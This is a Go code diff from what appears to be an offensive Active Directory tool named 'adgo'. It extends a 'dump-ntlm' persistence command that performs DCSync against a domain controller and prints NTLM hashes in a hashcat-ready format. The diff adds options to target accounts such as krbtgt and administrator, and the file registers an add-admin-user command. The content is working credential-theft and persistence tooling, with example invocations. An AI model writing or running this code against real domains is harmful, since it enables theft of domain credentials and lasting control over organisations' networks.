@@ -1,4 +1,5 @@
 // cmd/adgo/commands/persistence.go
+
 package commands
 
 import (
@@ -30,26 +31,50 @@ var AddAdminUserCmd = &cobra.Command{
 	},
 }
 
-// DumpNTLMHashesCmd dump les hashs NTLM avec DCSync.
+// DumpNTLMHashesCmd dump les hashs NTLM avec DCSync natif Go.
 var DumpNTLMHashesCmd = &cobra.Command{
 	Use:   "dump-ntlm",
-	Short: "Dump NTLM hashes using DCSync",
+	Short: "Dump NTLM hashes using native DCSync (MS-DRSR, no external dependencies)",
+	Example: `
+  adgo persistence dump-ntlm -u admin -p Password123 -d lab.local --dc-ip 192.168.1.10
+  adgo persistence dump-ntlm -u admin -p Password123 -d lab.local --dc-ip 192.168.1.10 --user krbtgt`,
 	RunE: func(cmd *cobra.Command, args []string) error {
 		dcIP, _ := cmd.Flags().GetString("dc-ip")
 		username, _ := cmd.Flags().GetString("username")
 		password, _ := cmd.Flags().GetString("password")
+		domain, _ := cmd.Flags().GetString("domain")
+		targetUser, _ := cmd.Flags().GetString("user")
 
-		hashes, err := exploits.DumpNTLMHashesWithDCSync(dcIP, username, password)
+		// Fallback sur les flags globaux si pas de flags locaux
+		if username == "" {
+			username = common.Username
+		}
+		if password == "" {
+			password = common.Password
+		}
+		if domain == "" {
+			domain = common.Domain
+		}
+
+		if dcIP == "" || username == "" || domain == "" {
+			return fmt.Errorf("--dc-ip, --username and --domain required")
+		}
+
+		common.PrintInfo(fmt.Sprintf("DCSync on %s (%s\\%s)", dcIP, domain, username))
+
+		hashes, err := exploits.DCSync(dcIP, username, domain, password, targetUser)
 		if err != nil {
-			common.PrintError(fmt.Errorf("failed to dump NTLM hashes: %v", err))
+			common.PrintError(fmt.Errorf("DCSync failed: %v", err))
 			return err
 		}
 
-		for _, hash := range hashes {
-			fmt.Printf("User: %s, Hash: %s\n", hash.SAMAccountName, hash.NTLMHash)
+		for _, h := range hashes {
+			// Format compatible hashcat / impacket secretsdump
+			fmt.Printf("%s\\%s:::%s:%s:::\n",
+				h.Domain, h.SAMAccountName, h.LMHash, h.NTHash)
 		}
 
-		common.PrintSuccess("NTLM hashes dumped successfully")
+		common.PrintSuccess(fmt.Sprintf("%d hash(s) retrieved", len(hashes)))
 		return nil
 	},
 }
@@ -62,6 +87,8 @@ func init() {
 	DumpNTLMHashesCmd.Flags().String("dc-ip", "", "IP address of the Domain Controller")
 	DumpNTLMHashesCmd.Flags().String("username", "", "Username for DCSync")
 	DumpNTLMHashesCmd.Flags().String("password", "", "Password for DCSync")
+	DumpNTLMHashesCmd.Flags().String("domain", "", "Domain name (ex: lab.local)")
+	DumpNTLMHashesCmd.Flags().String("user", "", "Target a specific user (ex: krbtgt, administrator)")
 
 	PersistenceCmd.AddCommand(AddAdminUserCmd)
 	PersistenceCmd.AddCommand(DumpNTLMHashesCmd)
